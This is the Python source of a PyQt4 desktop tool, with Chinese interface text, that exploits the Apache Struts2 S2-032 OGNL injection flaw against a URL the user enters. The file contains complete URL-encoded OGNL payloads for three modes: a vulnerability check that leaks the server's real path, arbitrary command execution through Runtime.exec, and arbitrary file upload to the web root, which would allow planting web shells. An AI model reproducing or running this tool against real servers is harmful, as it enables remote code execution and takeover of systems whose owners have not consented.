# -*- coding:utf-8 -*-
import sys
from PyQt4 import QtCore, QtGui, QtWebKit
from s2032 import Ui_MainWindow
import urllib.request
import urllib.parse
import urllib

class StartQt4(QtGui.QMainWindow):
    def __init__(self, parent=None):
        QtGui.QWidget.__init__(self, parent)
        self.ui = Ui_MainWindow() #框主题名称
        self.ui.setupUi(self) 
        QtCore.QObject.connect(self.ui.lineEdit, QtCore.SIGNAL('returnPressed()'), self.Go)
        QtCore.QObject.connect(self.ui.pushButton, QtCore.SIGNAL("clicked()"), self.Go)
        QtCore.QObject.connect(self.ui.comboBox, QtCore.SIGNAL("currentIndexChanged(int)"), self.mode)
        QtCore.QObject.connect(self.ui.pushButton_2, QtCore.SIGNAL("clicked()"), self.file_dialog)

    def PoC(self):
        payload= "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get%28%23a%29,%23b%3d%23req.getRealPath%28%23c%29,%23hh%3d%23context.get%28%23parameters.rpsobj[0]%29,%23hh.getWriter%28%29.println%28%23parameters.content[0]%29,%23hh.getWriter%28%29.println%28%23b%29,%23hh.getWriter%28%29.flush%28%29,%23hh.getWriter%28%29.close%28%29,1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=111&content=S2-032%20dir--***"
        target_url = (self.address + payload)
        #print(target_url)
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            if response:
                data = response.read()
                data = str(data, encoding = "utf-8")
                self.ui.textBrowser.setText("测试结果：\n%s" %(data)) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
        
    def cmd(self):
        self.command = str(self.ui.command.text())
        payload= "?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=" 
        target_url = (self.address + payload + self.command)
        #print(target_url)
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            data = response.read()
            data = str(data, encoding = "utf-8")
            self.ui.textBrowser.setText("%s命令执行结果：\n%s" %(self.command, data.rstrip())) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))

    def Go(self):
        self.address = str(self.ui.lineEdit.text())
        if self.address:
            if self.address.find('://') == -1:
               self.address = 'http://' + self.address
        if self.ui.comboBox.currentIndex() == 0:
            self.PoC()
        if self.ui.comboBox.currentIndex() == 1:
            self.cmd()
        elif self.ui.comboBox.currentIndex() == 2:
            self.upload()

    def file_dialog(self):
        fd = QtGui.QFileDialog(self)
        self.file = fd.getOpenFileName()
        from os.path import isfile
        if isfile(self.file):
            import codecs
            text = codecs.open(self.file, "r", "utf-8").read() #弹出文件选择对话框
        self.filename = str(self.ui.filename.text())
        
    def upload(self): 
        content = (open(self.file, "r").read())
        #print(content)
        temp = "&reqobj=%s&content=%s" %(self.filename, content)
        payload = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get%28%23a%29,%23b%3d%23req.getRealPath%28%23c%29%2b%23parameters.reqobj[2],%23fos%3dnew%20java.io.FileOutputStream%28%23b%29,%23fos.write%28%23parameters.content[0].getBytes%28%29%29,%23fos.close%28%29,%23hh%3d%23context.get%28%23parameters.rpsobj[0]%29,%23hh.getWriter%28%29.println%28%23b%29,%23hh.getWriter%28%29.flush%28%29,%23hh.getWriter%28%29.close%28%29,1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f"
        #payload = payload.replace(' ', '')
        #print(payload)
        target_url = (self.address + payload + temp)
        try:
            #print(target_url)
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req) 
            data = response.read()
            data = str(data, encoding = "utf-8")
            self.ui.textBrowser.setText("上传成功，文件路径是：\n%s" %(data)) #将结果输出至textBrowser
        except Exception as e:
            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
    def mode(self):
        self.ui.comboBox.currentIndex()
            
       
       
if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    myapp = StartQt4()
    myapp.show()
    sys.exit(app.exec_())
